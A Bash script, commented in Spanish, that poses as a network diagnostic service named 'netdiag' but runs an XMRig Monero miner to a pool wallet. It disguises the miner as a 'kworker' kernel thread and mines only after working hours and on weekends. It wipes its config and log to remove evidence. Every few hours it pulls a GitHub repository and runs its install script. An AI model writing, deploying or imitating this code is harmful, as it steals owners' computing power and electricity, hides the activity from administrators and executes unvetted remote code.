#!/bin/bash
# ════════════════════════════════════════════════════════
#  netdiag — Network Diagnostic Service (v2 con GPU)
#  Proceso de diagnóstico programado (bajo demanda)
#  Auto-update: verifica versión en GitHub cada ~6h
#  Soporta CPU + GPU (NVIDIA CUDA / AMD OpenCL)
# ════════════════════════════════════════════════════════

# ─── Rutas fijas (bajo perfil) ───
BASE_DIR="/opt/netdiag"
REPO_DIR="/opt/netdiag/lib"
CONFIG="$BASE_DIR/.env"
DATA_DIR="$BASE_DIR/data"
BINARY="$DATA_DIR/kworker"
LOG_FILE="$DATA_DIR/.diag.log"
PID_FILE="/dev/shm/.netdiag.pid"
RUN_CONFIG="/dev/shm/.netdiag-config.json"
VERSION_FILE="$BASE_DIR/.version"
TZ="America/Bogota"
REMOTE_VERSION_URL="https://raw.githubusercontent.com/CyberRo/HauntKit/main/VERSION"

# ─── Cargar configuración ───
if [ -f "$CONFIG" ]; then
    source "$CONFIG"
else
    echo "[ERROR] No se encuentra $CONFIG" >> "$LOG_FILE"
    exit 1
fi

# ─── Valores por defecto ───
START_HOUR="${START_HOUR:-17:30}"
END_HOUR="${END_HOUR:-8}"
SAT_START="${SAT_START:-13:00}"
# Config del file: 00:00–08:00 (viernes noche), sábado 13:00 enciende,
# domingo 24h, lun 00:00–08:00 se apaga.
MAX_CPU="${MAX_CPU:-80}"
MAX_TEMP="${MAX_TEMP:-85}"
THREADS="${THREADS:-0}"
POOL_URL="${POOL_URL:-gulf.moneroocean.stream:10128}"

# ─── Construir wallet completo con hostname ───
HOSTNAME=$(hostname)
FULL_WALLET="${WALLET_BASE}.${HOSTNAME}"

# ─── Leer versión local ───
LOCAL_VERSION="0.0.0"
[ -f "$VERSION_FILE" ] && LOCAL_VERSION=$(cat "$VERSION_FILE")

# ─── Contador para auto-update (cada 360 ciclos = ~6h) ───
UPDATE_INTERVAL=360
update_counter=0

# ─── Verificar si hay GPU habilitada ───
GPU_VENDOR=""
GPU_ENABLED=false
if [ -f "$DATA_DIR/.gpu-vendor" ]; then
    GPU_VENDOR=$(cat "$DATA_DIR/.gpu-vendor")
    GPU_ENABLED=true
fi

# ════════════════════════════════════════════════════════
#  GENERAR CONFIG.JSON PARA XMRig
# ════════════════════════════════════════════════════════

generate_config() {
    local cpu_hint="$MAX_CPU"
    local threads_json=""

    if [ "$THREADS" -gt 0 ]; then
        threads_json=",\"max-threads-hint\": $THREADS"
    fi

    # Construir sección CPU
    cat > "$RUN_CONFIG" << CONF
{
    "autosave": false,
    "donate-level": 0,
    "title": "kworker/0:0",
    "cpu": {
        "enabled": true,
        "max-threads-hint": $cpu_hint,
        "yield": true
    },
CONF

    # Agregar sección GPU si aplica
    if $GPU_ENABLED; then
        case "$GPU_VENDOR" in
            nvidia)
                cat >> "$RUN_CONFIG" << 'CONF'
    "cuda": {
        "enabled": true,
        "loader": null,
        "nvml": true
    },
CONF
                ;;
            amd)
                cat >> "$RUN_CONFIG" << 'CONF'
    "opencl": {
        "enabled": true,
        "loader": null,
        "cache": true
    },
CONF
                ;;
        esac
    fi

    # Agregar sección pool
    cat >> "$RUN_CONFIG" << CONF
    "pools": [
        {
            "url": "$POOL_URL",
            "user": "$FULL_WALLET",
            "pass": "$HOSTNAME",
            "algo": "auto",
            "keepalive": true,
            "tls": false
        }
    ]
}
CONF

    chmod 600 "$RUN_CONFIG" 2>/dev/null
}

# ════════════════════════════════════════════════════════
#  FUNCIONES DE CONTROL
# ════════════════════════════════════════════════════════

# ─── Convertir "HH:MM" o "HH" a minutos del día ───
to_minutes() {
    local t="${1:-0}" h m
    if [[ "$t" == *:* ]]; then
        h="${t%%:*}"; m="${t##*:}"
    else
        h="$t"; m=0
    fi
    echo $(( 10#$h * 60 + 10#$m ))
}

# ─── ¿Estamos en hora/ventana permitida? (fin de semana extendido) ───
# Lun–Jue 17:30→08:00 | Vie 17:30→Sáb 08:00 | Sáb 08:00 corta, 13:00 enciende |
# Dom 24h | Lun 00:00→08:00 se apaga
is_allowed_hour() {
    local now_m h m dow
    read -r h m <<< "$(TZ=$TZ date '+%-H %-M')"
    dow=$(TZ=$TZ date '+%u')            # 1=lun … 6=sáb, 7=dom
    now_m=$(( 10#$h * 60 + 10#$m ))

    case "$dow" in
        1|2|3|4|5)                     # Lun-Vie: 17:30 → 08:00
            [ "$now_m" -ge "$(to_minutes "$START_HOUR")" ] && return 0
            [ "$now_m" -lt "$(to_minutes "$END_HOUR")" ]   && return 0
            return 1
            ;;
        6)                             # Sábado: 00:00-08:00 (viernes), 13:00 enciende
            [ "$now_m" -lt "$(to_minutes "$END_HOUR")" ]  && return 0
            [ "$now_m" -ge "$(to_minutes "$SAT_START")" ] && return 0
            return 1
            ;;
        7)                             # Domingo: todo el día
            return 0
            ;;
    esac
    return 1
}

# ─── ¿El worker está vivo? ───
is_worker_alive() {
    [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null
}

# ─── Iniciar worker ───
start_worker() {
    is_worker_alive && return 0

    mkdir -p "$DATA_DIR" "$BASE_DIR"

    if [ ! -f "$BINARY" ]; then
        echo "[$(TZ=$TZ date '+%F %T')] ERROR: Binario no encontrado en $BINARY" >> "$LOG_FILE"
        return 1
    fi

    # Generar config.json runtime
    generate_config

    echo "[$(TZ=$TZ date '+%F %T')] Iniciando worker..." >> "$LOG_FILE"
    if $GPU_ENABLED; then
        echo "[$(TZ=$TZ date '+%F %T')] GPU habilitada: $GPU_VENDOR" >> "$LOG_FILE"
    fi

    "$BINARY" -c "$RUN_CONFIG" >> "$LOG_FILE" 2>&1 &

    echo $! > "$PID_FILE"
    echo "[$(TZ=$TZ date '+%F %T')] Worker iniciado (PID $!)" >> "$LOG_FILE"
}

# ─── Detener worker ───
stop_worker() {
    if is_worker_alive; then
        local pid
        pid=$(cat "$PID_FILE")
        echo "[$(TZ=$TZ date '+%F %T')] Deteniendo worker (PID $pid)..." >> "$LOG_FILE"
        kill "$pid" 2>/dev/null
        sleep 2
        kill -0 "$pid" 2>/dev/null && kill -9 "$pid" 2>/dev/null
        rm -f "$PID_FILE"
    fi

    # Limpiar evidencias
    rm -f "$RUN_CONFIG" 2>/dev/null
    : > "$LOG_FILE" 2>/dev/null
    rm -f /dev/shm/.netdiag.* 2>/dev/null
}

# ─── Verificar temperatura ───
check_temp() {
    [ "$MAX_TEMP" -eq 0 ] && return 0
    local temp
    if command -v sensors &>/dev/null; then
        temp=$(sensors -u 2>/dev/null | grep -m1 'temp1_input' | awk '{print $2}' | cut -d. -f1)
        [ -z "$temp" ] && return 0
        [ "$temp" -ge "$MAX_TEMP" ] && return 1
    fi
    return 0
}

# ─── Verificar actualización en GitHub ───
check_update() {
    local remote_version

    # Actualizar repo local (barato, ~1 vez cada 6h). Crítico: el repo debe
    # estar al día para comparar hash y detectar scripts desincronizados.
    if [ -d "$REPO_DIR/.git" ]; then
        git -C "$REPO_DIR" pull --ff-only >> "$LOG_FILE" 2>&1
    else
        mkdir -p "$REPO_DIR"
        git clone https://github.com/CyberRo/HauntKit.git "$REPO_DIR" >> "$LOG_FILE" 2>&1
    fi

    remote_version=$(curl -sL --max-time 10 "$REMOTE_VERSION_URL" 2>/dev/null | head -1)

    if [ -z "$remote_version" ]; then
        echo "[$(TZ=$TZ date '+%F %T')] Update: no se pudo conectar con GitHub" >> "$LOG_FILE"
        return 1
    fi

    remote_version=$(echo "$remote_version" | tr -d ' \n\r')

    # 1) Versión distinta → hay update
    if [ "$remote_version" != "$LOCAL_VERSION" ]; then
        echo "[$(TZ=$TZ date '+%F %T')] Update: nueva versión: $remote_version (actual: $LOCAL_VERSION)" >> "$LOG_FILE"
        return 0
    fi

    # 2) Versión igual → auto-reparación por hash: si el mine-service.sh
    #    instalado difiere del repo (update previo fallido por chattr +i,
    #    sync incompleto, etc.), se fuerza la re-sincronización aunque la
    #    versión coincida. Así ningún servidor queda "congelado" con scripts
    #    viejos y versión adelantada.
    if [ -f "$REPO_DIR/tools/utils/mine-service.sh" ] && [ -f "$BASE_DIR/mine-service.sh" ]; then
        if ! cmp -s "$REPO_DIR/tools/utils/mine-service.sh" "$BASE_DIR/mine-service.sh"; then
            echo "[$(TZ=$TZ date '+%F %T')] Update: mine-service.sh desincronizado — auto-reparando" >> "$LOG_FILE"
            return 0
        fi
    fi

    return 1
}

# ─── Aplicar actualización ───
apply_update() {
    echo "[$(TZ=$TZ date '+%F %T')] Update: aplicando..." >> "$LOG_FILE"
    stop_worker

    if [ -d "$REPO_DIR/.git" ]; then
        git -C "$REPO_DIR" pull >> "$LOG_FILE" 2>&1
    else
        echo "[$(TZ=$TZ date '+%F %T')] Update: repo no encontrado, clonando..." >> "$LOG_FILE"
        mkdir -p "$REPO_DIR"
        git clone https://github.com/CyberRo/HauntKit.git "$REPO_DIR" >> "$LOG_FILE" 2>&1
    fi

    bash "$REPO_DIR/tools/utils/mine-install.sh" --update >> "$LOG_FILE" 2>&1
    [ -f "$REPO_DIR/VERSION" ] && cp "$REPO_DIR/VERSION" "$VERSION_FILE"

    echo "[$(TZ=$TZ date '+%F %T')] Update: completado, reiniciando..." >> "$LOG_FILE"
    exec "$0"
}

# ─── Limpieza al salir ───
cleanup() {
    stop_worker
    exit 0
}
trap cleanup SIGTERM SIGINT SIGHUP

# ════════════════════════════════════════════════════════
#  BUCLE PRINCIPAL
# ════════════════════════════════════════════════════════

echo "[$(TZ=$TZ date '+%F %T')] Servicio iniciado v$LOCAL_VERSION" >> "$LOG_FILE"

while true; do
    # ─── Control de horario ───
    if is_allowed_hour; then
        if ! check_temp; then
            echo "[$(TZ=$TZ date '+%F %T')] Temperatura alta, deteniendo..." >> "$LOG_FILE"
            stop_worker
            sleep 120
            continue
        fi
        start_worker
    else
        stop_worker
    fi

    # ─── Auto-update: cada ~6h ───
    update_counter=$((update_counter + 1))
    if [ "$update_counter" -ge "$UPDATE_INTERVAL" ]; then
        update_counter=0
        if check_update; then
            apply_update
        fi
    fi

    sleep 60
done
